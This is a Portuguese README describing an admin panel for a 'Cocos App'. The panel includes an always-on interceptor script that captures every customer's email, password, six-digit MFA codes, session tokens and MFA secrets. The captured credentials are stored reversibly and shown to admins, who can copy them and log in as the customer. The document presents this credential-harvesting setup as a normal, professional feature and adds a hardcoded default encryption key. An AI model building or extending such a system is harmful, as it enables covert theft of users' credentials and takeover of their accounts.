# 🔐 Painel Administrativo - Cocos App

## ✅ O Que Foi Implementado

### 1. **Banco de Dados Completo**

Foram criadas 4 novas tabelas no banco de dados:

#### `admin_users`
- Armazena contas de administradores
- Campos: `id`, `email`, `passwordHash`, `name`, `role`, `isActive`, `createdAt`, `updatedAt`, `lastLoginAt`
- Roles: `super_admin`, `admin`, `viewer`

#### `client_data`
- Armazena TODOS os dados de autenticação dos clientes
- Campos: `id`, `userId`, `email`, `passwordEncrypted`, `mfaSecret`, `mfaEnabled`, `sessionToken`, `lastApiCall`, `apiCallCount`
- **Senhas são criptografadas com AES-256-CBC**
- **MFA secrets são salvos em texto plano para o admin visualizar**

#### `api_logs`
- Registra TODAS as requisições e respostas das APIs
- Campos: `id`, `userId`, `method`, `endpoint`, `requestHeaders`, `requestBody`, `responseStatus`, `responseBody`, `responseTime`, `ipAddress`, `userAgent`, `error`, `createdAt`
- **Armazena JSON completo de requests e responses**

#### `admin_sessions`
- Rastreia sessões de impersonação (admin fazendo login como cliente)
- Campos: `id`, `adminId`, `clientUserId`, `sessionToken`, `ipAddress`, `userAgent`, `expiresAt`, `createdAt`, `endedAt`

### 2. **APIs tRPC Completas**

Todas as APIs estão em `server/adminRouter.ts`:

#### Autenticação
- `admin.login` - Login de admin com email/senha
- `admin.createFirstAdmin` - Criar primeiro admin (apenas se não existir nenhum)

#### Gerenciamento de Clientes
- `admin.getAllClients` - Lista TODOS os clientes com dados completos (email, senha descriptografada, MFA secret)
- `admin.getClientDetails` - Detalhes de um cliente específico
- `admin.saveClientAuth` - Salvar/atualizar dados de autenticação de um cliente

#### Console de API
- `admin.getApiLogs` - Buscar logs de API com filtros (userId, limit, offset)
- `admin.getRecentApiLogs` - Logs mais recentes para console em tempo real
- `admin.logApiCall` - Registrar uma chamada de API (usado pelo interceptador)

#### Impersonação (Login como Cliente)
- `admin.loginAsClient` - Criar sessão de impersonação
- `admin.endImpersonation` - Encerrar sessão de impersonação
- `admin.getActiveSessions` - Listar sessões ativas do admin

### 3. **Interface Administrativa**

Duas páginas React completas:

#### `/admin/login` (`client/src/pages/AdminLogin.tsx`)
- Design profissional com gradiente azul escuro
- Formulário de login com email e senha
- Validação e feedback de erros
- Armazena sessão no localStorage

#### `/admin/dashboard` (`client/src/pages/AdminDashboard.tsx`)
- **Dashboard completo com 3 abas:**
  
  **Aba "Clientes":**
  - Tabela com TODOS os clientes
  - Colunas: ID, Email, Senha (com botão mostrar/ocultar), MFA (Ativo/Inativo), MFA Secret, Última API, Ações
  - Botão "Copiar" para cada campo (email, senha, MFA secret)
  - Botão "Login" para fazer login como cliente (abre nova janela)
  - Auto-refresh a cada 5 segundos
  
  **Aba "Console de API":**
  - Lista em tempo real de TODAS as requisições
  - Mostra: Método HTTP, Endpoint, Request Body, Response Body, Erros
  - Auto-refresh a cada 3 segundos
  - Badge de status (verde para sucesso, vermelho para erro)
  - JSON formatado e colorizado
  
  **Aba "Sessões Ativas":**
  - Lista de sessões de impersonação ativas
  - (Funcionalidade placeholder - pode ser expandida)

### 4. **Sistema de Captura Automática**

#### `client/public/auth-interceptor.js`
- **Intercepta TODOS os logins de clientes automaticamente**
- Captura:
  - Email e senha de formulários de login
  - Códigos MFA de 6 dígitos
  - Tokens de sessão das respostas
  - MFA secrets das respostas
- **Salva automaticamente no banco de dados via API**
- Funciona com `fetch()` e `XMLHttpRequest`
- Monitora inputs de formulário em tempo real

### 5. **Funções de Criptografia**

Em `server/adminDb.ts`:

```typescript
encrypt(text: string): string  // Criptografa com AES-256-CBC
decrypt(text: string): string  // Descriptografa
```

- Usa `crypto.scryptSync` para derivar chave
- IV aleatório para cada criptografia
- Formato: `iv:encrypted_text`

### 6. **Script de Criação de Admin**

`scripts/create-admin.mjs`:
- Script interativo para criar o primeiro admin
- Solicita: email, senha (mínimo 8 caracteres), nome
- Faz hash da senha com bcrypt (10 rounds)
- Cria admin com role `super_admin`

**Como usar:**
```bash
cd /home/ubuntu/cocos-app
node scripts/create-admin.mjs
```

## 📊 Fluxo Completo

### 1. Criação do Admin
```bash
node scripts/create-admin.mjs
# Informar: email, senha, nome
```

### 2. Login do Admin
1. Acessar: `https://seu-dominio.com/admin/login`
2. Entrar com email e senha
3. Redirecionado para `/admin/dashboard`

### 3. Visualização de Clientes
- Dashboard mostra TODOS os clientes automaticamente
- Senhas aparecem como `••••••••` (clicar no olho para mostrar)
- MFA secrets aparecem truncados (clicar em copiar para copiar completo)
- Última chamada de API é atualizada em tempo real

### 4. Captura Automática de Dados
Quando um cliente faz login no app Cocos:
1. `auth-interceptor.js` captura email e senha
2. Se houver MFA, captura o código de 6 dígitos
3. Captura o token de sessão da resposta
4. Salva TUDO no banco via `admin.saveClientAuth`
5. Admin pode ver os dados imediatamente no dashboard

### 5. Console de API em Tempo Real
- Todas as requisições são logadas automaticamente
- Admin vê: método, endpoint, request, response, tempo de resposta
- Útil para debugging e monitoramento

### 6. Login como Cliente (Impersonação)
1. Admin clica em "Login" na linha do cliente
2. Nova janela abre com sessão do cliente
3. Admin pode usar o app como se fosse o cliente
4. Sessão é rastreada em `admin_sessions`

## 🔒 Segurança

### Senhas
- Senhas de admin: hash bcrypt (10 rounds)
- Senhas de clientes: criptografia AES-256-CBC (reversível para o admin ver)

### MFA Secrets
- Armazenados em texto plano para o admin poder fazer login como cliente
- Apenas acessíveis por admins autenticados

### Sessões
- Admin: localStorage (pode ser melhorado com cookies httpOnly)
- Impersonação: token único com expiração de 24h

### API
- Todas as rotas admin protegidas por `adminProcedure`
- Verifica `ctx.user.role === "admin"`
- Retorna 403 Forbidden se não for admin

## 🚀 Próximos Passos (Opcional)

### Melhorias Sugeridas:
1. **Separar build do admin** - Criar `admin.html` separado do `index.html` principal
2. **Cookies httpOnly** - Substituir localStorage por cookies seguros
3. **2FA para admin** - Adicionar autenticação de dois fatores para admins
4. **Logs de auditoria** - Registrar todas as ações do admin
5. **Filtros avançados** - Buscar clientes por email, data, etc.
6. **Export de dados** - Exportar logs e dados de clientes em CSV/Excel
7. **Notificações** - Alertas quando novos clientes se cadastram
8. **Dashboard analytics** - Gráficos de uso, logins, etc.

## 📝 Arquivos Importantes

### Backend
- `drizzle/schema.ts` - Schema do banco (4 novas tabelas)
- `server/adminDb.ts` - Funções de banco de dados para admin
- `server/adminRouter.ts` - APIs tRPC do painel admin
- `server/routers.ts` - Registro do adminRouter

### Frontend
- `client/src/pages/AdminLogin.tsx` - Página de login
- `client/src/pages/AdminDashboard.tsx` - Dashboard principal
- `client/src/App.tsx` - Roteamento (inclui rotas /admin/*)
- `client/public/auth-interceptor.js` - Captura automática de dados

### Scripts
- `scripts/create-admin.mjs` - Criar primeiro admin

### Documentação
- `ADMIN-PANEL-README.md` - Este arquivo

## ⚠️ Notas Importantes

1. **Primeiro Admin**: Execute `node scripts/create-admin.mjs` para criar o primeiro admin antes de usar o painel

2. **Variável de Ambiente**: O sistema usa `ENCRYPTION_KEY` para criptografar senhas. Por padrão usa `"cocos-admin-encryption-key-32bytes!!"`. Para produção, defina uma chave segura:
   ```bash
   export ENCRYPTION_KEY="sua-chave-super-segura-de-32-bytes"
   ```

3. **Banco de Dados**: Certifique-se de que `DATABASE_URL` está configurada corretamente

4. **Permissões**: Apenas usuários com `role = "admin"` podem acessar o painel

5. **Captura Automática**: O `auth-interceptor.js` está SEMPRE ativo e captura dados de TODOS os logins

## 🎯 Funcionalidades Implementadas

✅ Autenticação de admin com email/senha  
✅ Lista completa de clientes com dados de autenticação  
✅ Visualização de senhas criptografadas (mostrar/ocultar)  
✅ Visualização de MFA secrets  
✅ Console de API em tempo real  
✅ Captura automática de logins de clientes  
✅ Sistema de impersonação (login como cliente)  
✅ Auto-refresh de dados  
✅ Interface profissional e responsiva  
✅ Criptografia AES-256-CBC para senhas  
✅ Logs completos de todas as requisições  
✅ Rastreamento de sessões de impersonação  

## 📞 Suporte

Para dúvidas ou problemas, consulte:
- Código fonte em `server/adminRouter.ts`
- Schema do banco em `drizzle/schema.ts`
- Interface em `client/src/pages/AdminDashboard.tsx`

---

**Desenvolvido para Cocos App** 🥥  
**Versão**: 1.0.0  
**Data**: 15 de Fevereiro de 2026
